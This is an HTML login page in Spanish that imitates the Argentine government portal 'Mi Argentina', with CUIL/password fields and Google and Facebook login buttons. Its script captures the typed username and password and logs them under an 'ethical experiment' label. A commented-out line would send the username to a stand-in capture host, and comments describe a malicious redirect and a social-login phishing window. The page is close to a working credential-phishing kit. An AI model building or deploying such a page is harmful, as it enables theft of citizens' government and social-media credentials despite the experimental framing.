<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar Sesión - Mi Argentina</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            background-color: #f0f4f8;
        }
        .btn-primary {
            background-color: #007bff;
            border-color: #007bff;
        }
        .btn-primary:hover {
            background-color: #0056b3;
            border-color: #0056b3;
        }
        .social-login-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: white;
            color: #333;
            text-decoration: none;
            font-weight: 500;
            transition: background-color 0.3s, color 0.3s;
        }
        .social-login-btn:hover {
            background-color: #f1f1f1;
        }
        .social-login-btn i {
            margin-right: 10px;
            font-size: 1.2em;
        }
    </style>
</head>
<body>
    <div class="min-h-screen flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
        <div class="max-w-md w-full space-y-8 bg-white p-8 rounded-xl shadow-xl">
            <div class="text-center">
                <a href="#" class="flex justify-center items-center mb-6">
                    <i class="fas fa-flag text-blue-700 text-4xl mr-3"></i>
                    <span class="text-3xl font-bold text-gray-900">Mi Argentina</span>
                </a>
                <h2 class="text-2xl font-extrabold text-gray-800">Iniciar sesión</h2>
                <p class="mt-2 text-sm text-gray-600">
                    O
                    <a href="#" class="font-medium text-blue-600 hover:text-blue-500">creá tu cuenta</a>
                </p>
            </div>
            <form class="mt-8 space-y-6" id="loginForm">
                <input type="hidden" name="remember" value="true">
                <div class="rounded-md shadow-sm -space-y-px">
                    <div>
                        <label for="username" class="sr-only">CUIL / Usuario</label>
                        <input id="username" name="username" type="text" autocomplete="username" required class="appearance-none rounded-none relative block w-full px-3 py-3 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-t-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 focus:z-10 sm:text-sm" placeholder="CUIL / Usuario">
                    </div>
                    <div>
                        <label for="password" class="sr-only">Contraseña</label>
                        <input id="password" name="password" type="password" autocomplete="current-password" required class="appearance-none rounded-none relative block w-full px-3 py-3 border border-gray-300 placeholder-gray-500 text-gray-900 rounded-b-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 focus:z-10 sm:text-sm" placeholder="Contraseña">
                    </div>
                </div>

                <div class="flex items-center justify-between">
                    <div class="flex items-center">
                        <input id="remember-me" name="remember-me" type="checkbox" class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
                        <label for="remember-me" class="ml-2 block text-sm text-gray-900">
                            Recordarme
                        </label>
                    </div>

                    <div class="text-sm">
                        <a href="#" class="font-medium text-blue-600 hover:text-blue-500">
                            ¿Olvidaste tu contraseña?
                        </a>
                    </div>
                </div>

                <div>
                    <button type="submit" class="group relative w-full flex justify-center py-3 px-4 border border-transparent text-sm font-medium rounded-md text-white btn-primary focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">
                        <span class="absolute left-0 inset-y-0 flex items-center pl-3">
                            <i class="fas fa-lock text-blue-500 group-hover:text-blue-400" aria-hidden="true"></i>
                        </span>
                        Ingresar
                    </button>
                </div>
            </form>

            <div class="mt-6">
                <div class="relative">
                    <div class="absolute inset-0 flex items-center">
                        <div class="w-full border-t border-gray-300"></div>
                    </div>
                    <div class="relative flex justify-center text-sm">
                        <span class="px-2 bg-white text-gray-500">O continuá con</span>
                    </div>
                </div>

                <div class="mt-6 grid grid-cols-2 gap-3">
                    <a href="#" class="social-login-btn" onclick="handleSocialLogin('Google')">
                        <i class="fab fa-google text-red-500"></i>
                        Google
                    </a>
                    <a href="#" class="social-login-btn" onclick="handleSocialLogin('Facebook')">
                        <i class="fab fa-facebook text-blue-600"></i>
                        Facebook
                    </a>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            if (username && password) {
                // Simulación de envío de datos
                console.log(`[EXPERIMENTO ETICO] Datos de login capturados:`);
                console.log(`Usuario: ${username}`);
                console.log(`Contraseña: ${password}`);
                
                // Simulación de redirección
                alert(`[SIMULACIÓN] Login exitoso. Redirigiendo al dashboard de ${username}...`);
                // En un escenario real, aquí se redirigiría al usuario o se realizaría una acción maliciosa.
                // window.location.href = 'https://pagina-de-control.com/captura?user=' + username;
            } else {
                alert('Por favor, completa todos los campos.');
            }
        });

        function handleSocialLogin(provider) {
            console.log(`[EXPERIMENTO ETICO] Intento de login con: ${provider}`);
            alert(`[SIMULACIÓN] Redirigiendo para autenticar con ${provider}...`);
            // En un escenario real, aquí se abriría una ventana de phishing para el proveedor social.
        }
    </script>
</body>
</html>
